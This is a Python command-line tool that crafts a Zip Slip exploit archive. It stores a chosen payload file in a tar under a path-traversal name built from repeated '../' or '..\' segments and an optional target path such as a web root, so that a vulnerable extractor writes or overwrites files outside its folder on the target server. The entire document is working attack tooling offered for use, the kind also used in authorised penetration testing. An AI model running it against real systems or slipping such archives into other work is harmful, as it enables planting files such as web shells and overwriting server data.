#!/usr/bin/env python3

import os, sys
import tarfile
from termcolor import colored
import zipfile,argparse

def getArguments():
    parser = argparse.ArgumentParser("Create Archive Payload to exploit Zipslip")
    parser.add_argument('-i','--input',dest='payloadFile',help="Payload File that has to be written/overwritten on target server",required=True)
    parser.add_argument('-o','--output',dest='outputFile',help="Output File Name",default='Exploit.tar')
    # parser.add_argument('-t','--type',dest='fileType',help="File Type - zip,tar,gz,tgz,bz2,jar(Default: tar)",default='tar') #TODO
    parser.add_argument('-d','--depth',dest='depth',help="Depth of the Traversal [Default: 3]",default=3,type=int)
    parser.add_argument('-p','--path',dest='path',help="Path to append to the traversal. Ex: var/www/webroot")
    parser.add_argument('--os',dest='targetOS',help="Target Platform (win|unix) [Default:unix)",default="unix")
    parser.add_argument('-c','--completeDir',dest='completeDir',help="Add All files in the provided Directory to the archive")
    args = parser.parse_args()
    return args
    
def createArchive(payloadFile,outputFile,traversalPath,completeDir):
    with tarfile.open(outputFile,"w") as tar:
        tar.add(payloadFile, traversalPath)  #Add the payload with archiveName as traversalPath
        if completeDir:
            files = os.listdir(completeDir)
            os.chdir(completeDir)
            for file in files:
                tar.add(file)

def main():
    args = getArguments()
    payloadFile = args.payloadFile
    outputFile = args.outputFile
    # fileType = args.fileType
    depth = args.depth
    path = args.path or ""
    targetOS = args.targetOS
    completeDir = args.completeDir or None

    if not os.path.exists(payloadFile):
        sys.exit("[-]Invalid payload file")

    if completeDir and not os.path.exists(completeDir):
        sys.exit("[-]Invalid Directory Provided")
        
    if targetOS == "unix":
        traversal = "../"
        if path and path[-1] != '/':
            path += '/'
    else:
        traversal = "..\\"
        if path and path[-1] != '\\':
            path += '\\'

    traversalPath = f"{traversal*depth}{path}{os.path.basename(payloadFile)}"
    createArchive(payloadFile,outputFile,traversalPath,completeDir)
    print(f"[-]Created {outputFile} with file having: {traversalPath}")

if __name__ == '__main__':
     main()